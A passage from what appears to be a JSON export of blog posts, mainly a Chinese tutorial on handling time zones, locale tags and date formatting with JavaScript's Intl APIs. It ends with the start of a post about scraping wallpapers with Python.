来命名一个时区。这里的城市一般为该时区中人口最多的城市。于是，我们可以将中国的通行时区表示为 <code>Asia/Shanghai</code>。也有一些时区有自己的别名，如太平洋标准时间 <code>PST</code> 和协调世界时 <code>UTC</code>。</p>\n<blockquote><p>时区名称使用城市而非国家，是由于国家的变动通常比城市的变动要快得多。</p></blockquote>\n<blockquote><p><strong>城市不是时区的最小单位。</strong>有很多城市同时处于多个时区，甚至澳大利亚<a href=\"https://en.wikipedia.org/wiki/Gold_Coast_Airport\" rel=\"noopener\">有一个机场</a>的跑道两端处于不同的时区。</p></blockquote>\n<h1>处理时区困难重重</h1>\n<p>几个月前的一天，<a href=\"https://milkice.me/\" rel=\"noopener\">奶冰</a>在他的 Telegram 频道里发了这样的一条消息：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\"><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\" alt=\"奶冰频道的消息\" width=\"500\" class=\"aligncenter size-medium wp-image-2490\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg 800w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-244x300.jpg 244w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-768x944.jpg 768w\" sizes=\"(max-width: 800px) 100vw, 800px\"></a>\n<p>你想的没错，这个问题正是由时区与 UTC 偏移的不同造成的。<code>Asia/Shanghai</code> 时区在 1940 年前后和 1986 年前后曾实行过夏令时，<strong>而夏令时的切换会导致一小时的出现和消失。</strong>具体来说，启用夏令时当天会有一个小时消失，如 2021.3.28 英国启用夏令时，1:00 直接跳到 3:00，导致 <code>2021-03-28 01:30:00</code> 在 <code>Europe/London</code> 时区中是不合法的；取消夏令时当天又会有一个小时重复，如 2021.10.31 英国取消夏令时，2:00 会重新跳回 1:00 一次，导致 <code>2021-10-31 01:30:00</code> 在 <code>Europe/London</code> 时区中对应了两个时间点。而在奶冰的例子中，<code>1988-04-10 00:46:50</code> 正好处于因夏令时启用而消失的一小时中，因此系统会认为此时间字符串不合法而拒绝解析。</p>\n<blockquote><p>你可能会注意到在历史上 1988.4.10 这一天 <code>Asia/Shanghai</code> 时区实际上是去掉了 1:00-2:00 这一小时而不是 0:00-1:00。上文问题更深层次的原因是，在 IANA TZDB 2018a 及更早版本中，IANA 因缺乏历史资料而设置了错误的夏令时规则，规则设定了夏令时交界于 0:00-1:00 从而导致上文问题发生。而随后社区<a href=\"http://mm.icann.org/pipermail/tz/2018-August/026760.html\" rel=\"noopener\">发现了更准确的史实</a>，因此 IANA 更新了数据库。上文的问题在更新了系统的时区数据库后便解决了。</p></blockquote>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\" alt=\"IANA TZDB 2018a 及之前版本的错误数据\" width=\"1750\" height=\"595\" class=\"aligncenter size-full wp-image-2491\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg 1750w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-300x102.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1024x348.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-768x261.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1536x522.jpg 1536w\" sizes=\"(max-width: 1750px) 100vw, 1750px\"></a>\n<p><span>IANA TZDB 2018a 及之前版本的错误数据</span></p>\n<p>再来考虑另一种情况。你的应用的某位巴西用户在 2018 年保存了一个未来时间 <code>2022-01-15 12:00</code>（按当时的规律那应该是个夏令时时间），不巧那时候你的应用是以格式化的时间字符串形式保存的时间。之后你发现巴西已经于 2019 年 4 月宣布彻底取消夏令时制度，那么 <code>2022-01-15 12:00</code> 这个时间对应的 Unix 时间戳发生了变化，变得不再准确，要正确处理这一字符串就需要参考这一字符串生成的时间（或生成时计算的 UTC 偏移）来做不同的处理。<strong>因此，应用从一开始就应该避免使用字符串来传输、存储时间，而是使用 Unix 时间戳。</strong>如果不得不使用字符串存储时间，请尽可能：</p>\n<ul>\n<li>使用 UTC 描述时间，你永远不会知道本地时区在未来会发生什么</li>\n<li>如果需要以当地时间描述时间，一定带上当前 UTC 偏移</li>\n</ul>\n<p>时区历史带来的问题往往意想不到而且远比想象得多。实际上时区历史数据非常详细而繁多且跨设备不一致，并没有简单而统一的处理方法。在需要严谨处理时区时可能需要在应用程序中内嵌一套各端统一的时区数据库，但这样的方案放在前端又会带来不少问题：</p>\n<ul>\n<li>体积过大。moment.js 曾经设计过<a href=\"https://github.com/moment/moment-timezone/blob/develop/data/packed/2021a.json\" rel=\"noopener\">一种简洁的 TZDB 表示</a>，但尽管已经尽可能压缩整个文件仍然达到了 180+KB。在性能优先的 Web 应用中这是不可接受的</li>\n<li>需要持续更新。时区数据一直在变动，需要在时区数据更新时尽快更新应用内的时区数据，这带来了额外的维护成本</li>\n</ul>\n<p>ES6 为我们带来了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl\" rel=\"noopener\"><code>Intl</code> 命名空间</a>。在这里，JavaScript 运行时提供了不少时间相关的国际化能力。因此，在不使用额外数据的情况下准确处理时区是可能的，但这并不完美：</p>\n<ul>\n<li>各端不统一。浏览器提供的时区数据受浏览器版本、系统版本等可能变化，最新的时区更新可能无法快速反映到所有设备上</li>\n<li>实现复杂。<code>JavaScript</code> 中 <code>Date</code> 对象的不良设计导致实现完善的时区处理并不容易，且 <code>Intl</code> 命名空间下的对象实例化性能开销较大，需要额外优化</li>\n</ul>\n<blockquote><p><code>Intl</code> 命名空间下还有很多实用的国际化相关方法，值得我们另开一篇文章来讲讲了。</p></blockquote>\n<p>在真实开发中，这需要取舍。目前主流的 JavaScript 时间处理库都已转向浏览器内置方法，并在需要时通过 Polyfill 保证跨端一致性。在这篇文章中，我们将尝试在不使用第三方库的情况下实现基本的时间国际化处理。此外，还有一些诸如需要使用 Unix 时间戳才能正确地在各端交换时间等细节需要注意。</p>\n<h1>时区转换</h1>\n<p>JavaScript 中的 <code>Date</code> 并不是不包含时区信息——实际上，<code>Date</code> 对象表示的一定是当前时区。通过尝试：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1970-01-01T00:00:00Z')\n// Thu Jan 01 1970 08:00:00 GMT+0800 (中国标准时间)</pre>\n<p>就可以知道，JavaScript 运行时其实知道当前时区，并会在需要的时候将其他时区的时间转换为当前时区的时间。那么，如何将本地时间转换为其他时区的时间呢？从 <code>Date</code> 的角度看，这并不行，因为我们无法设置一个 <code>Date</code> 对象的时区。但我们可以“投机取巧”：将 <code>Date</code> 对象的时间加上/减去对应的时差，尽管 <code>Date</code> 对象仍然认为自己在本地时区，但这样不就可以正确显示了嘛！但我们会碰到上文提到的问题：时区之间的时间差并不固定，在没有额外数据的情况下很难正确计算。</p>\n<p>还好，ES6 基于 <code>Intl</code> 命名空间扩展了 <code>Date.prototype.toLocaleString()</code> 方法，使其可以接受时区参数并按指定时区格式化时间。如果你在搜索引擎中搜索如何使用 JavaScript 转换时区，你大概率会在 StackOverflow 上找到类似这样的答案：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const convertTimeZone = (date, timeZone) =&gt; {\n    return new Date(date.toLocaleString('en-US', { timeZone }))\n}\n\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\nconvertTimeZone(now, 'Europe/London') // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<p>很好理解，我们使用 <code>en-US</code> 的区域设置要求 JavaScript 运行时以我们指定的时区格式化时间，再将时间字符串重新解析为时间对象。这里的 <code>timeZone</code> 就是诸如 <code>Asia/Shanghai</code> 等的 IANA TZDB 时区名称。这个字符串确实需要自己提供，但这就是我们唯一需要自己准备的数据了！只要提供了时区名称，浏览器就会自动计算正确的时间，无需我们自行计算。</p>\n<blockquote><p>对于时区名称，你可以考虑使用 <a href=\"https://github.com/vvo/tzdb/\" rel=\"noopener\">@vvo/tzdb</a>。这是一个声称为自动更新的 IANA TZDB 的 JSON 导出，并已被数个大型项目使用。你可以从这个包中导出所有时区名称。</p></blockquote>\n<p>这个方法看起来还不错，对吧？但实际上，它有两个问题：</p>\n<ul>\n<li>指定了区域设置和时区的 <code>toLocaleString()</code> 实际上每次调用都会在 JavaScript 运行时中创建新的 <code>Intl.DateTimeFormat</code> 对象（在后文详述），而后者会带来昂贵的性能开销（在 Node 14 中，实例化一次会在 V8 中增加内存使用约 46.3Kb。但这是符合预期的，详见 <a href=\"https://bugs.chromium.org/p/v8/issues/detail?id=6528\" rel=\"noopener\">V8 Issue</a>）。因此，在密集调用的情况下需要考虑计算并缓存时差，并在一定时间后或需要时进行更新</li>\n<li>使用 <code>toLocaleString()</code> 并使用 <code>en-US</code> 区域设置格式化的默认时间格式类似于 <code>10/13/2021, 1:00:00 AM</code>。这可以被大部分浏览器正确解析，<strong>但这是不规范的，不同浏览器有可能产生不同结果。</strong>你也可以自行配置格式（同下文的 <code>Intl.DateTimeFormat</code>），但仍然无法构造出规范的字符串</li>\n</ul>\n<p>因此，更佳的方案是，我们需要建立一个可反复使用的格式化器以避免重复创建 <code>Intl.DateTimeFormat</code> 带来的额外开销，并需要手动构造出符合规范的时间字符串，并将其重新解析为 <code>Date</code> 对象。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const timeZoneConverter = (timeZone) =&gt; {\n    // 新建 DateTimeFormat 对象以供对同一目标时区重用\n    // 由于时区属性必须在创建 DateTimeFormat 对象时指定，我们只能为同一时区重用格式化器\n    const formatter = new Intl.DateTimeFormat('zh-CN', {\n        year: 'numeric',\n        month: '2-digit',\n        day: '2-digit',\n        hour: '2-digit',\n        minute: '2-digit',\n        second: '2-digit',\n        hour12: false,\n        timeZone\n    })\n    return {\n        // 提供 conver 方法以将提供的 Date 对象转换为指定时区\n        convert (date) {\n            // zh-CN 的区域设置会返回类似 1970/01/01 00:00:00 的字符串\n            // 替换字符即可构造出类似 1970-01-01T00:00:00 的 ISO 8601 标准格式时间字符串并被正确解析\n            return new Date(formatter.format(date).replace(/\\//g, '-').replace(' ', 'T').trim())\n        }\n    }\n}\n\nconst toLondonTime = timeZoneConverter('Europe/London') // 对于同一时区，此对象可重用\n\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\ntoLondonTime.convert(now) // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<blockquote><p>目前 <code>zh-CN</code> 的区域设置会产生类似 <code>1970/01/01 00:00:00</code> 的格式化字符串。这一格式目前跨端一致，但由于规范没有指定时间格式，<strong>这个格式在未来有可能变更。</strong>更好的方案是使用 <code>formatToParts()</code> 方法（在后文详述）获取时间字符串的各部分并手动拼接出标准格式的字符串，但在这个例子中直接 <code>replace</code> 拥有更好的性能。</p></blockquote>\n<p>现在，尝试反复转换时间至同一时区 1000 次，耗时从 <code>toLocaleString()</code> 1.5 秒降低到了 0.04 秒。尽管代码长了点，但这次重写在最好的情况下为我们带来了超过 20 倍的性能提升。</p>\n<p>需要注意的是，虽然这看起来就算最终方案了，但这个方案依然不完美。主要有以下两个问题：</p>\n<ul>\n<li>在需要密集转换为不同时区时，由于无法重用格式化器，性能依然较差且难以进一步优化</li>\n<li>由于 <code>Intl.DateTimeFormat</code> 不支持格式化毫秒，在格式化字符串的过程中毫秒会丢失，导致最终结果可能会与期望结果产生最高 999ms 的误差，需要额外处理。比如需要计算时差时，我们可能需要这么写：\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const calcTimeDiff = (date, converter) =&gt; {\n    const secDate = date - date.getMilliseconds() // 去掉毫秒，避免转换前后精度差异\n    return converter.convert(new Date(secDate), tzName) - secDate\n}\n\ncalcTimeDiff(new Date(), timeZoneConverter('Europe/London')) // -25200000</pre>\n</li>\n</ul>\n<p>无论如何，在折腾一番后我们还是把时区正确转换了。接下来准备格式化时间字符串了吗？不过在此之前，我们得先来聊聊语言、文字和区域。</p>\n<h1>语言文字区域傻傻分不清</h1>\n<blockquote><p>如何在计算机中表示中文？</p></blockquote>\n<p>“这不简单，”你可能会说，“用 <code>zh</code> 啊。”</p>\n<blockquote><p>那简体中文呢？</p></blockquote>\n<p>“<code>zh-CN</code>。”你或许会说出这个答案。</p>\n<blockquote><p>那用于新加坡的简体中文和用于中国大陆的简体中文该如何区分呢？</p></blockquote>\n<p>嗯……好问题。</p>\n<p>要能正确区分不同的简体中文，我们还得先回到定义上。实际上，“国际化”并不只是语言的翻译而已，国际化包含的是一整套对于各个<strong>区域</strong>的本地化方案。要准确表示一个国际化方案，我们实际至少需要确定三个属性：语言（Language）、文字（Script）和区域（Locale）。</p>\n<ul>\n<li>\n<strong>语言</strong>通常指的是<strong>声音语言</strong>。不同的语言都有一套自己的发音规则，很难互通。如中文和英语都属于语言</li>\n<li>\n<strong>文字</strong>对应的是某个语言的书写方式，同样的语言可能会有多种书写方案。如中文主要有简体和繁体两种书写方案</li>\n<li>\n<strong>区域</strong>指国际化面向的地区，相同的语言和文字，在不同地区也有可能会有不同的使用习惯。如新加坡和中国大陆都使用简体中文，但两地的用词习惯等有些许差异</li>\n</ul>\n<p>只有确定了这三个属性，我们才能正确定义一个国际化方案（或者说<strong>区域设置</strong>）。当然，还有很多其他属性可以更准确的表达某个区域设置，但通常有语言、文字和区域就已经足够了。</p>\n<p>于是，基于 <a href=\"https://tools.ietf.org/rfc/bcp/bcp47.txt\" rel=\"noopener\">BCP 47</a>，我们可以知道：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN = 中文普通话-简体-中国大陆\ncmn-Hans-SG = 中文普通话-简体-新加坡\ncmn-Hant-TW = 中文普通话-繁体-台湾\nyue-Hant-HK = 中文粤语-繁体-香港</pre>\n<p>等等，这都是啥？还有 BCP 47 又是啥？BCP 是 IETF 发布的“最佳当前实践”文档，而 BCP 47 是一些国际化相关的 ISO 和备忘录的集合，也是目前事实上由 HTML 和 ECMAScript 所使用的表达区域设置的标准。BCP 47 定义的区域设置标签实际上比较复杂，但对于大部分简单使用情况，上文示例中的格式已经完全够用了。简单来说，<strong>要表达一个区域设置，我们会使用 <code>语言[-文字][-区域]</code> 的格式，而文字和区域都是可选的。</strong>而对于每个部分的具体代码，BCP 47 也有做具体定义。其中：</p>\n<ul>\n<li>语言使用 ISO 639-1 定义的两位字母代码（如中文为 <code>zh</code>，英文为 <code>en</code>）或 <a href=\"https://iso639-3.sil.org/code_tables/639/data\" rel=\"noopener\">ISO 639-2/3</a> 定义的三位字母代码（如中文普通话为 <code>cmn</code>，英文为 <code>eng</code>），通常小写</li>\n<li>文字使用 <a href=\"https://unicode.org/iso15924/iso15924-codes.html\" rel=\"noopener\">ISO 15924</a> 定义的四位字母代码，通常首字母大写。如简体中文是 <code>Hans</code>，繁体中文是 <code>Hant</code>\n</li>\n<li>区域通常使用 <a href=\"https://www.iso.org/iso-3166-country-codes.html\" rel=\"noopener\">ISO 3166-1</a> 定义的两位字母代码，通常大写，如中国大陆为 <code>CN</code>，英国为 <code>GB</code>\n</li>\n</ul>\n<blockquote><p>ISO 639-1/2/3 的关系实际是：ISO 639-1 是最早制定的规范，使用两位字母表示语言，但语言数量之多并不能只用两位代码表示。因此后来修订了 ISO 639-2 和 3，使用三位字母表示了更多语言。通常 639-1 代码和 ISO-2/3 代码是一对多的关系。如中文 <code>zh</code> 其实是中文普通话 <code>cmn</code> 的宏语言（macrolanguage），同样使用 <code>zh</code> 为宏语言的语言还有 <code>wuu</code>（中文吴语）、<code>hak</code>（中文客家话）、<code>yue</code>（中文粤语）等数十种。<strong>从规范上我们现在应该使用 ISO 639-2/3 代码来替代 ISO 639-1 代码了</strong>，但由于历史阻力和真实需求中分类无需如此细致等原因，<strong>使用 ISO 639-1 指定语言仍然非常常见而且完全可以接受。</strong>此外，特别地，我们在 ISO 639-3 中定义未指明的语言为 <code>und</code>。</p></blockquote>\n<p>因此，对于这一节开头的两个问题，在 BCP 47 中正确答案其实是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">zh = 中文\ncmn = 中文普通话\n\nzh-Hans = 中文-简体\ncmn-Hans = 中文普通话-简体</pre>\n<p>而 <code>zh-CN</code> 实际是指在中国大陆使用的中文，当然也包含在中国大陆使用的繁体中文。<strong>不过，由于大部分情况下一个区域只会通用一种文字，很多情况下我们可以忽略文字这一项</strong>，即使用 <code>zh-CN</code>（或者 <code>cmn-CN</code>）来表示中国大陆的简体中文普通话——毕竟在大部分业务中在中国大陆使用繁体和非普通话的情况非常少。</p>\n<blockquote><p>事实上，类似 <code>zh-Hans</code> 和 <code>zh-Hant</code> 开头的区域设置名称已经被标记为 <code>redundant 废弃</code>，因此尽可能只使用 <code>zh-CN</code> 或者 <code>cmn-Hans-CN</code> 这样的区域设置名称。所有区域设置名称的列表可以在 <a href=\"https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry\" rel=\"noopener\">IANA</a> 找到。</p></blockquote>\n<p>现在我们可以准确定义一个区域设置了。不过我们还有一些小小的需求。比如我们想在 <code>cmn-Hans-CN</code> 的区域设置中使用农历来表示日期，但显然我们上文定义的表示方法并不能表达这一需求。好在，Unicode 为 BCP 47 提供了 u 扩展。在区域设置名称后面加上 <code>-u-[选项]</code> 就可以表达更细致的变体了。所以我们有：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN-u-ca-chinese = 中文普通话-简体-中国大陆-u-日历-中国农历\njpn-Jpan-JP-u-ca-japanese = 日语-日文汉字/平假名/片假名-日本-u-日历-日本日历\ncmn-Hans-CN-u-nu-hansfin = 中文普通话-简体-中国大陆-u-数字-简体大写数字</pre>\n<p>u 扩展的具体可选项可以在 <a href=\"https://www.unicode.org/reports/tr35/tr35-21.html#Unicode_locale_identifier\" rel=\"noopener\">Unicode 网站</a>上找到。而多个 u 扩展还可以连接——于是我们甚至可以写出 <code>cmn-Hans-CN-u-ca-chinese-nu-hansfin</code> 这种丧心病狂的区域设置名称。当然，相信你现在已经可以看懂这个区域设置的意思了。</p>\n<blockquote><p>不同地区可能会有不同的日历使用习惯，如中国有使用农历的需求，泰国有使用佛历的需求，我们可以通过 u 扩展指定不同的日历。不过，大部分情况下我们会使用标准的 ISO 8601 日历（gregory），JavaScript 的 <code>Date</code> 对象也只支持这种日历。</p></blockquote>\n<blockquote><p>你可以使用 <a href=\"https://r12a.github.io/app-subtags/\" rel=\"noopener\">BCP47 language subtag lookup</a> 工具快速检查你编写的 BCP 47 区域标签是否规范。</p></blockquote>\n<p>终于我们可以正确表达一个完美符合我们需求的区域设置了。接下来，让我们开始格式化时间吧。</p>\n<h1>格式化时间</h1>\n<p>这题我会！</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const formatDate(date) =&gt; {\n    return `${date.getFullYear()}-${`${date.getMonth() + 1}`.padStart(2, '0')}-${`${date.getDate()}`.padStart(2, '0')} ${`${date.getHours()}`.padStart(2, '0')}:${`${date.getMinutes()}`.padStart(2, '0')}:${`${date.getSeconds()}`.padStart(2, '0')}`\n}\n\nformatDate(new Date()) // 2021-10-13 01:00:00</pre>\n<p>就完事了……吗？先不论这样的格式化代码难以阅读，尽管上文这样的日期格式国际通用，<strong>但并非所有区域都习惯于这样的日期表示方法。</strong>比如英语国家/地区在很多时候习惯在日期中加入星期，而阿拉伯语国家/地区在部分情况下习惯使用阿拉伯语数字（而非常用的阿拉伯-印度数字）；再比如美式英语国家/地区习惯月-日-年的日期表示法，而英式英语国家/地区习惯日-月-年的日期表示法……不同区域在时间表示格式习惯上的差异是巨大的，<strong>我们很难通过一个简单的方法来正确地、国际化地格式化一个日期。</strong></p>\n<p>好在 ES6 早就为我们铺平了道路。还记得上文提到过的 <code>Intl.DateTimeFormat</code> 吗？我们通过它来实例化一个日期格式化器并用进行日期的国际化。</p>\n<p>直接来看例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const options = {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    weekday: 'long'\n}\nconst now = new Date()\n\nconst enUSFormatter = new Intl.DateTimeFormat('en-US', options)\n\nconst zhCNFormatter = new Intl.DateTimeFormat('zh-CN', options)\nconst zhCNAltFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', options)\nconst zhCNAlt2Formatter = new Intl.DateTimeFormat('zh-CN-u-ca-roc-nu-hansfin', options)\n\nconst jaFormatter = new Intl.DateTimeFormat('ja', options)\nconst jaAltFormatter = new Intl.DateTimeFormat('ja-JP-u-ca-japanese', options)\n\nconst arEGFormatter = new Intl.DateTimeFormat('ar-EG', options)\n\nenUSFormatter.format(now) // Wednesday, Oct 13, 2021\n\nzhCNFormatter.format(now) // 2021年10月13日星期三\nzhCNAltFormatter.format(now) // 2021辛丑年九月8星期三\nzhCNAlt2Formatter.format(now) // 民国壹佰壹拾年拾月拾叁日星期三\n\njaFormatter.format(now) // 2021年10月13日水曜日\njaAltFormatter.format(now) // 令和3年10月13日水曜日\n\narEGFormatter.format(now) // الأربعاء، ١٣ أكتوبر ٢٠٢١</pre>\n<blockquote><p>在这里我们使用 ISO 639-1 代码来表示语言，是由于事实上 ISO 639-1 代码更加常见与通用。在大部分支持 <code>Intl.DateTimeFormat</code> 的 JavaScript 运行时中我们也可以使用 ISO 639-2/3 代码来表示语言（但实际会 fallback 至对应的 ISO 639-1 代码）。</p></blockquote>\n<blockquote><p>你也可以通过在 <code>options</code> 中设置 <code>calendar</code> 属性和 <code>numberingSystem</code> 属性来替换区域设置名称中对 u 扩展的使用。这也是推荐方式。</p></blockquote>\n<p>这非常直观，我们可以指定区域设置和格式化选项来初始化一个格式化器，并在之后使用格式化器对象的 <code>format</code> 方法来格式化一个 <code>Date</code> 对象。这里的格式化选项其实非常灵活，能格式化的不只是日期，时间也可以被灵活地格式化，有非常多的组合可以选择。我们不会在这里详细解释每一个选项，你可以访问 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat\" rel=\"noopener\">MDN 文档</a>来了解更多。</p>\n<blockquote><p>如前文所述，<code>Intl.DateTimeFormat</code> 无法格式化毫秒。</p></blockquote>\n<p>不过需要注意的是，<strong>JavaScript 运行时不一定支持所有区域设置，也不一定支持所有格式化选项。</strong>在遇到不支持的情况时，<code>Intl.DateTimeFormat</code> 默认会静默 fallback 到最匹配的支持项，因此在处理不常见的区域设置或选项时，你可能需要再额外检查。你可以通过 <code>Intl.DateTimeFormat.supportedLocalesOf()</code> 静态方法判断当前运行时是否支持指定的区域设置，也可以在实例化格式化器后在对象上调用 <code>resolvedOptions()</code> 方法来检查运行时的解析结果是否与预期一致。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('yue-Hant-CN').resolvedOptions()\n// {locale: 'zh-CN', calendar: 'gregory', …}\n// fallback 至 zh-CN，与 yue-CN 的预期不一致</pre>\n<p>此外，正如你所看到的，各种语言在日期格式化中使用的文本 JavaScript 运行时都已经帮我们内置了。因此，我们甚至可以利用这些国际化特性来为我们的应用减少一点需要翻译的字符串——打包进应用的翻译越少，应用体积也就越小了嘛——比如说获取一周七天对应的名字：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getWeekdayNames = (locale) =&gt; {\n     // 基于一个固定日期计算，这里选择 1970.1.1\n     // 不能使用 0，因为 Unix 时间戳 0 在不同时区的日期不一样\n    const base = new Date(1970, 0, 1).getTime()\n    const formatter = new Intl.DateTimeFormat(locale, { weekday: 'short' })\n    return Array.from({ length: 7 }, (_, day) =&gt; (\n        formatter.format(new Date(base + 3600000 * 24 * (-4 + day))) // 1970.1.1 是周四\n    ))\n}\n\ngetWeekdayNames('en-US') // ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat']\ngetWeekdayNames('zh-CN') // ['周日', '周一', '周二', '周三', '周四', '周五', '周六']\ngetWeekdayNames('ja') // ['日', '月', '火', '水', '木', '金', '土']\ngetWeekdayNames('ar-EG') // ['الأحد', 'الاثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت']</pre>\n<p>当然，如果你还是不喜欢运行时为你提供的格式，我们还有上文提到过的 <code>formatToParts()</code> 方法可以用。来看一个简单的例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Intl.DateTimeFormat('zh-CN', {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    weekday: 'long',\n    hour: 'numeric',\n    minute: 'numeric',\n    second: 'numeric',\n}).formatToParts(new Date())\n// [\n//     { type: 'year', value: '2021' },\n//     { type: 'literal', value: '年' },\n//     { type: 'month', value: '10' },\n//     { type: 'literal', value: '月' },\n//     { type: 'day', value: '13' },\n//     { type: 'literal', value: '日' },\n//     { type: 'weekday', value: '星期三' },\n//     { type: 'literal', value: ' ' },\n//     { type: 'dayPeriod', value: '上午' },\n//     { type: 'hour', value: '1' },\n//     { type: 'literal', value: ':' },\n//     { type: 'minute', value: '00' },\n//     { type: 'literal', value: ':' },\n//     { type: 'second', value: '00' }\n// ]</pre>\n<p>随后，你就可以自己解析这个数组来构造出你想要的时间格式了。最后，我们还可以使用 <code>Intl.RelativeTimeFormat</code> 来格式化相对日期。当然我们不会在这里详细讲解这个 API，你可以参考 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/RelativeTimeFormat\" rel=\"noopener\">MDN 文档</a>。直接来看一个简单例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const getRelativeTime = (num, unit, locale) =&gt; {\n    return new Intl.RelativeTimeFormat(locale, { numeric: 'auto' }).format(num, unit)\n}\n\ngetRelativeTime(-3, 'day', 'en-US') // 3 days ago\ngetRelativeTime(-1, 'day', 'zh-CN') // 昨天\ngetRelativeTime(0, 'second', 'zh-CN') // 现在\ngetRelativeTime(3, 'hour', 'ja') // 3 時間後</pre>\n<blockquote><p><code>Intl.RelativeTimeFormat</code> 是一个相对较晚进入标准的对象，因此浏览器支持程度较差，可能需要使用 <a href=\"https://formatjs.io/docs/polyfills/intl-relativetimeformat\" rel=\"noopener\">Polyfill</a>。不过目前（2021.10）主流浏览器的最新版本均已支持此 API。</p></blockquote>\n<h1>未来</h1>\n<p>我希望这篇文章时区转换的部分可以很快过时——这并非无稽之谈，目前（2021.10）TC39 的 <a href=\"https://github.com/tc39/proposal-temporal\" rel=\"noopener\"><code>Temporal</code> 提案</a>已经进入 Stage 3 了。<strong><code>Temporal</code> 提案定义了一个新的、时区友好的 <code>Temporal</code> 命名空间，并期望在不久后就能进入标准并最终应用于生产环境。</strong><code>Temporal</code> 定义了完整的时区、时间段、日历规则的处理，且拥有简单明了的 API。那时候，JavaScript 的时区处理就不会再如此痛苦了。由于目前 <code>Temporal</code> 提案还未进入标准，API 暂未稳定，我们无法将其用于生产环境，但我们可以来看一个简单的例子感受一下这个 API 的强大。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const zonedDateTime = Temporal.ZonedDateTime.from({\n  timeZone: 'America/Los_Angeles',\n  year: 1995,\n  month: 12,\n  day: 7,\n  hour: 3,\n  minute: 24,\n  second: 30,\n  millisecond: 0,\n  microsecond: 3,\n  nanosecond: 500,\n  calendar: 'iso8601'\n}) // 1995-12-07T03:24:30.0000035-08:00[America/Los_Angeles]</pre>\n<p>如果你希望立刻开始使用 <code>Temporal</code>，现在已有 Polyfill 可用。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"js-temporal\" data-mdxgithubp=\"temporal-polyfill\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/js-temporal/temporal-polyfill\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>不过，时区问题不会消失，各地区的习惯也很难融合到一起。时间的国际化处理是<a href=\"https://yourcalendricalfallacyis.com/\" rel=\"noopener\">极其复杂</a>的，前端中的时间国际化仍然值得我们认真关注。</p>\n","link":"https://flyhigher.top/develop/2482.html"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span 